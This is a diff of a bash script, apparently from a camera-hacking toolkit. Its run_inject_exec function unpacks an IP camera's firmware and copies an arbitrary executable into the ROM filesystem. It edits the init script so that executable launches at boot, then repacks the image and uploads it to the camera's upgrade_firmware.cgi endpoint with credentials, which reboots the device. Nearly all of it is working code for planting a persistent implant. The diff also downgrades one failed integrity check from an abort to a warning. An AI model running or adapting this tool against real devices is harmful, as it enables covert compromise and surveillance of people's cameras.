@@ -48,17 +48,13 @@ run_inject_exec()
 
     # Locate sys firmware 
     SYS_FW_FILE=$SYS_FW_LIB/$SYSTEM_VERSION/lr_cmos_$SYSTEM_VERSION.bin
-    if [[ ! -f $SYS_FW_FILE ]]
-    then
-        die "$SYS_FW_FILE does not exist. Aborting run_inject_exec"
-    fi
+    [[ -f $SYS_FW_FILE ]] || die "$SYS_FW_FILE does not exist. Aborting run_inject_exec"
+    green "Found matching system firmware in the library"
 
     # Verify integrity of sys firmware
     $SYSEXTRACT -c $SYS_FW_FILE
-    if [[ $? != 0 ]]
-    then
-        die "Could not verify integrity of $SYS_FS_FILE"
-    fi
+    [[ $? == 0 ]] || red "Could not verify integrity of $SYS_FS_FILE"
+    green "Verified the integrity of system firmware "
     
     # Create temporary directory
     TMP_SYS_FW_DIR=/tmp/sys_fw$SUFFIX/
@@ -66,27 +62,44 @@ run_inject_exec()
 
     # Extract firmware 
     $SYSEXTRACT -x $SYS_FW_FILE -o $TMP_SYS_FW_DIR
+    [[ $? == 0 ]] || die "Could not extract firmware from $SYS_FW_FILE"
+    green "Successfully extracted system firmware"
     
     # Mount romfs and make a rw copy 
     mkdir -p $TMP_SYS_FW_DIR/rom $TMP_SYS_FW_DIR/rom-rw
-    mount -o loop $TMP_SYS_FW_DIR/romfs.img $TMP_SYS_FW_DIR/rom
+    mount -o loop $TMP_SYS_FW_DIR/romfs.img $TMP_SYS_FW_DIR/rom >/dev/null 2>&1
     cp -R $TMP_SYS_FW_DIR/rom/* $TMP_SYS_FW_DIR/rom-rw
     umount $TMP_SYS_FW_DIR/rom
+    green "Mounted the ROM-FS image"
 
     # Copy executable file over and add to init
     cp $EXEC $TMP_SYS_FW_DIR/rom-rw/bin
     EXEC_BASENAME=$(basename $EXEC)
     sed -i 's/camera\&/camera\&\n'$EXEC_BASENAME'\&/' $TMP_SYS_FW_DIR/rom-rw/bin/init
+    green "Injected the binary $EXEC into the ROM-FS"
 
     # Genromfs
     mkdir -p $TMP_SYS_FW_DIR/new
     $GENROMFS -f $TMP_SYS_FW_DIR/new/romfs.img -d $TMP_SYS_FW_DIR/rom-rw
+    [[ $? == 0 ]] || die "Could not generate ROMFS image"
+    green "Generated new ROM-FS image"
 
     # Pack and verify integrity
     NEW_FW_FILE=$TMP_SYS_FW_DIR/new/lr_cmos_$SYSTEM_VERSION.bin
     $SYSPACK -k $TMP_SYS_FW_DIR/linux.bin -i $TMP_SYS_FW_DIR/new/romfs.img -o $NEW_FW_FILE 
     $SYSEXTRACT -c $NEW_FW_FILE
-    echo $TMP_SYS_FW_DIR
-}
+    [[ $? == 0 ]] || die "Could not verify integrity of $NEW_FW_FILE"
+    echo
+    green "Created new firmware image ($NEW_FW_FILE)"
 
+    echo "Trying to upload system firmware to $ADDR"
+    # Upload file to the camera
+    CODE=$($CURL -s -o /dev/null -w "%{http_code}" \
+        -F "file=@$NEW_FW_FILE;filename=$EXEC_BASENAME;type=application/binary" \
+        $ADDR/upgrade_firmware.cgi'?next_url=reboot.htm&user='$USERNAME'&pwd='$PASSWORD
+    )
+        
+    [[ $CODE == 200 ]] || die "Uploading firmware to $ADDR failed"
+    green "Successfully uploaded firmware and rebooted $ADDR"
+}
 
